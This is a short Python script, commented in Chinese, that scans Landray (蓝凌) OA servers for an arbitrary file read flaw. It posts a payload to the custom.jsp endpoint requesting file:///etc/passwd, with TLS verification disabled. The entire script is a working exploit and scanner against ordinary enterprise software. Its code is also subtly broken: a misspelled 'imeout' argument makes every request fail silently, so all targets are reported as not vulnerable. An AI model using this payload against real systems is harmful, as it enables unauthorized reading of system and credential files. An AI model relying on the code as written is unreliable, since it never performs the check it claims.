#!/usr/bin/env python
# coding=utf-8
#蓝凌OA任意文件读取漏洞
import requests, threading
from termcolor import colored

requests.packages.urllib3.disable_warnings()  # 忽略证书报错

results = ''


def pscan_vuln(url):
    global results
    try:
        data = 'var={"body":{"file":"file:///etc/passwd"}}'
        response = requests.post(url=url + '/sys/ui/extend/varkind/custom.jsp', verify=False, data=data, imeout=20)
        if 'root' in response.text:
            print(colored('[+]存在蓝凌OA任意文件读取漏洞', 'red'))
            results = f'{url}-->存在蓝凌OA任意文件读取漏洞'
        else:
            print('[-]不存在蓝凌OA任意文件读取漏洞')
    except:
        print('[-]不存在蓝凌OA任意文件读取漏洞')


def langlingAOfile(urls):
    threads = []
    t = threading.Thread(target=pscan_vuln, args=(str(urls),))
    threads.append(t)
    t.start()
    for t in threads:
        t.join()
    return results
